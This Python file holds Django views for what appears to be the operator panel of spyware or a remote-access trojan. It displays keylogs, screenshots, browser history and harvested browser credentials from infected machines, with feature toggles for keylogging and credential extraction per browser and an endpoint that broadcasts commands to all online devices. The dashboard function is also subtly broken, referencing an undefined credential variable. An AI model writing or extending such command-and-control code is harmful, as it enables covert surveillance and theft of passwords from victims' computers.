"""
Dashboard views for the web frontend.
Renders templates with data from the API models.
Force reloader trigger.
"""

from datetime import timedelta

from django.contrib.admin.views.decorators import staff_member_required
from django.db.models import Count
from django.http import JsonResponse
from django.shortcuts import get_object_or_404, redirect, render
from django.utils import timezone
from django.views.decorators.http import require_POST

from api.models import (
    Command, Device, DeviceConfig, FileMetadata, KeylogData, ScreenshotMeta,
    BrowserHistory, BrowserCredential
)


@staff_member_required
def dashboard(request):
    """Main dashboard view with overview stats."""
    now = timezone.now()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    online_threshold = now - timedelta(minutes=5)
    
    # Get stats
    total_devices = Device.objects.filter(is_active=True).count()
    active_devices = Device.objects.filter(is_active=True, last_seen__gte=online_threshold).count()
    total_screenshots = ScreenshotMeta.objects.filter(captured_at__gte=today_start).count()
    total_keylogs = KeylogData.objects.filter(received_at__gte=today_start).count()
    total_creds = BrowserCredential.objects.count()
    pending_commands = Command.objects.filter(status='pending').count()
    
    # Recent devices
    recent_devices = Device.objects.filter(is_active=True).order_by('-last_seen')[:5]
    for device in recent_devices:
        device.is_online = device.last_seen and device.last_seen >= online_threshold
    
    # Recent screenshots
    recent_screenshots = ScreenshotMeta.objects.select_related('device').order_by('-captured_at')[:8]
    
    # Recent activity (simplified)
    recent_activity = []
    
    for ss in ScreenshotMeta.objects.select_related('device').order_by('-captured_at')[:3]:
        recent_activity.append({
            'type': 'screenshot',
            'icon': 'camera',
            'message': f'Screenshot from {ss.device.hostname}',
            'time': ss.captured_at,
        })
    
    for kl in KeylogData.objects.select_related('device').order_by('-received_at')[:3]:
        recent_activity.append({
            'type': 'keylog',
            'icon': 'keyboard',
            'message': f'{kl.character_count} keystrokes from {kl.device.hostname}',
            'time': kl.received_at,
        })
        
        recent_activity.append({
            'type': 'credential',
            'icon': 'lock',
            'message': f'New credential for {cr.origin_url}',
            'device_hostname': cr.device.hostname,
            'time': cr.received_at,
            'url': cr.origin_url
        })
    
    recent_activity.sort(key=lambda x: x['time'], reverse=True)
    recent_activity = recent_activity[:5]
    
    return render(request, 'dashboard.html', {
        'total_devices': total_devices,
        'active_devices': active_devices,
        'total_screenshots': total_screenshots,
        'total_keylogs': total_keylogs,
        'total_creds': total_creds,
        'pending_commands': pending_commands,
        'recent_devices': recent_devices,
        'recent_screenshots': recent_screenshots,
        'recent_activity': recent_activity,
    })


@staff_member_required
def devices(request):
    """Devices list view."""
    online_threshold = timezone.now() - timedelta(minutes=5)
    
    device_list = Device.objects.filter(is_active=True).order_by('-last_seen')
    
    for device in device_list:
        device.is_online = device.last_seen and device.last_seen >= online_threshold
        device.screenshot_count = ScreenshotMeta.objects.filter(device=device).count()
        device.keylog_count = KeylogData.objects.filter(device=device).count()
        device.command_count = Command.objects.filter(device=device).count()
    
    return render(request, 'devices.html', {
        'devices': device_list,
    })


@staff_member_required
def device_detail(request, device_id):
    """Device detail view with screenshots, keylogs, commands."""
    device = get_object_or_404(Device, id=device_id)
    online_threshold = timezone.now() - timedelta(minutes=5)
    device.is_online = device.last_seen and device.last_seen >= online_threshold
    
    # Get or create config
    config, _ = DeviceConfig.objects.get_or_create(device=device)
    device.config = config
    
    screenshots = ScreenshotMeta.objects.filter(device=device).order_by('-captured_at')[:20]
    keylogs = KeylogData.objects.filter(device=device).order_by('-received_at')[:10]
    files = FileMetadata.objects.filter(device=device).order_by('-created_at')[:10]
    commands = Command.objects.filter(device=device).order_by('-created_at')[:20]
    
    # Browser data stats
    history_count = BrowserHistory.objects.filter(device=device).count()
    credential_count = BrowserCredential.objects.filter(device=device).count()
    
    return render(request, 'device_detail.html', {
        'device': device,
        'screenshots': screenshots,
        'keylogs': keylogs,
        'files': files,
        'commands': commands,
        'history_count': history_count,
        'credential_count': credential_count,
    })


@staff_member_required
def device_settings(request, device_id):
    """Device settings view."""
    device = get_object_or_404(Device, id=device_id)
    config, _ = DeviceConfig.objects.get_or_create(device=device)
    
    if request.method == 'POST':
        form_type = request.POST.get('form_type', '')
        
        if form_type == 'features':
            config.screenshots_enabled = 'screenshots_enabled' in request.POST
            config.keylogger_enabled = 'keylogger_enabled' in request.POST
            config.screenshot_on_browser = 'browser_trigger' in request.POST
            config.file_upload_enabled = 'file_upload' in request.POST
            config.browser_data_enabled = 'browser_data' in request.POST
        else:
            config.kill_switch = 'kill_switch' in request.POST
            config.screenshot_quality = int(request.POST.get('screenshot_quality', 75))
            config.config_sync_interval = int(request.POST.get('sync_interval', 600))
            config.keylog_sync_interval = int(request.POST.get('keylog_interval', 300))
            config.browser_history_sync_interval = int(request.POST.get('browser_interval', 14400))
        
        config.save()
        return redirect('device_settings', device_id=device_id)
    
    return render(request, 'device_settings.html', {
        'device': device,
        'config': config,
    })


@staff_member_required
def device_delete(request, device_id):
    """Delete a device."""
    if request.method == 'DELETE':
        device = get_object_or_404(Device, id=device_id)
        device.is_active = False
        device.save()
        return JsonResponse({'status': 'deleted'})
    return JsonResponse({'error': 'Method not allowed'}, status=405)


@staff_member_required
def screenshots(request):
    """Screenshots gallery view."""
    screenshot_list = ScreenshotMeta.objects.select_related('device').order_by('-captured_at')[:100]
    device_list = Device.objects.filter(is_active=True)
    
    return render(request, 'screenshots.html', {
        'screenshots': screenshot_list,
        'devices': device_list,
    })


@staff_member_required
def keylogs(request):
    """Keylogs list view."""
    device_filter = request.GET.get('device', '')
    
    queryset = KeylogData.objects.select_related('device').order_by('-received_at')
    if device_filter:
        queryset = queryset.filter(device__id=device_filter)
    
    keylog_list = queryset[:50]
    device_list = Device.objects.filter(is_active=True)
    
    return render(request, 'keylogs.html', {
        'keylogs': keylog_list,
        'devices': device_list,
        'selected_device': device_filter,
    })


@staff_member_required
def browser_history(request):
    """Browser history view."""
    device_filter = request.GET.get('device', '')
    queryset = BrowserHistory.objects.select_related('device').order_by('-last_visit_time')
    
    if device_filter:
        queryset = queryset.filter(device__id=device_filter)
        
    history_list = queryset[:100]
    device_list = Device.objects.filter(is_active=True)
    
    return render(request, 'browser_history.html', {
        'history': history_list,
        'devices': device_list,
        'selected_device': device_filter,
    })


# browser_cookies view removed


@staff_member_required
def browser_credentials(request):
    """Browser credentials view."""
    device_filter = request.GET.get('device', '')
    queryset = BrowserCredential.objects.select_related('device').order_by('-received_at')
    
    if device_filter:
        queryset = queryset.filter(device__id=device_filter)
        
    cred_list = queryset[:100]
    device_list = Device.objects.filter(is_active=True)
    
    return render(request, 'browser_credentials.html', {
        'credentials': cred_list,
        'devices': device_list,
        'selected_device': device_filter,
    })


@staff_member_required
def files(request):
    """Files list view."""
    file_list = FileMetadata.objects.select_related('device').order_by('-created_at')[:100]
    
    return render(request, 'files.html', {
        'files': file_list,
    })


@staff_member_required
def commands(request):
    """Commands queue view."""
    command_list = Command.objects.select_related('device').order_by('-created_at')[:100]
    device_list = Device.objects.filter(is_active=True)
    
    return render(request, 'commands.html', {
        'commands': command_list,
        'devices': device_list,
    })


@staff_member_required
def settings_view(request):
    """Global settings view."""
    # Get default config or create one
    default_config = DeviceConfig.objects.filter(device__isnull=True).first()
    if not default_config:
        default_config = DeviceConfig()
    
    # Check global kill switch
    global_kill = Device.objects.filter(is_active=True).exists() and \
                  DeviceConfig.objects.filter(kill_switch=True).count() == \
                  Device.objects.filter(is_active=True).count()
    
    if request.method == 'POST':
        form_type = request.POST.get('form_type', '')
        
        if form_type == 'features':
            # Update default feature toggles
            pass
        elif form_type == 'browsers':
            # Update browser list
            pass
        else:
            # Global settings
            if 'global_kill_switch' in request.POST:
                DeviceConfig.objects.all().update(kill_switch=True)
            else:
                DeviceConfig.objects.all().update(kill_switch=False)
        
        return redirect('settings')
    
    features = [
        {'key': 'screenshots', 'name': 'Screenshots', 'description': 'Enable screenshot capture', 'enabled': True},
        {'key': 'keylogger', 'name': 'Keylogger', 'description': 'Enable keystroke logging', 'enabled': True},
        {'key': 'browser_trigger', 'name': 'Browser Trigger', 'description': 'Screenshot on browser launch', 'enabled': True},
        {'key': 'file_upload', 'name': 'File Upload', 'description': 'Enable file uploads', 'enabled': True},
        {'key': 'browser_data', 'name': 'Browser Data', 'description': 'Extract history and credentials', 'enabled': True},
    ]
    
    browsers = [
        {'name': 'chrome.exe', 'display': 'Chrome', 'enabled': True},
        {'name': 'firefox.exe', 'display': 'Firefox', 'enabled': True},
        {'name': 'msedge.exe', 'display': 'Edge', 'enabled': True},
        {'name': 'brave.exe', 'display': 'Brave', 'enabled': True},
        {'name': 'opera.exe', 'display': 'Opera', 'enabled': False},
    ]
    
    return render(request, 'settings.html', {
        'default_config': default_config,
        'global_kill_switch': global_kill,
        'features': features,
        'browsers': browsers,
        'total_devices': Device.objects.filter(is_active=True).count(),
    })


@staff_member_required
@require_POST
def send_command(request):
    """Send command to device(s)."""
    import json
    
    try:
        data = json.loads(request.body)
        device_id = data.get('device_id')
        command_type = data.get('command_type')
        payload = data.get('payload', {})
        
        if not command_type:
            return JsonResponse({'error': 'command_type required'}, status=400)
        
        if device_id:
            # Single device
            device = get_object_or_404(Device, id=device_id)
            Command.objects.create(
                device=device,
                command_type=command_type,
                payload=payload or {}
            )
            return JsonResponse({'status': 'sent', 'count': 1})
        else:
            # All online devices
            online_threshold = timezone.now() - timedelta(minutes=5)
            devices = Device.objects.filter(
                is_active=True,
                last_seen__gte=online_threshold
            )
            count = 0
            for device in devices:
                Command.objects.create(
                    device=device,
                    command_type=command_type,
                    payload=payload or {}
                )
                count += 1
            return JsonResponse({'status': 'sent', 'count': count})
    
    except json.JSONDecodeError:
        return JsonResponse({'error': 'Invalid JSON'}, status=400)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)
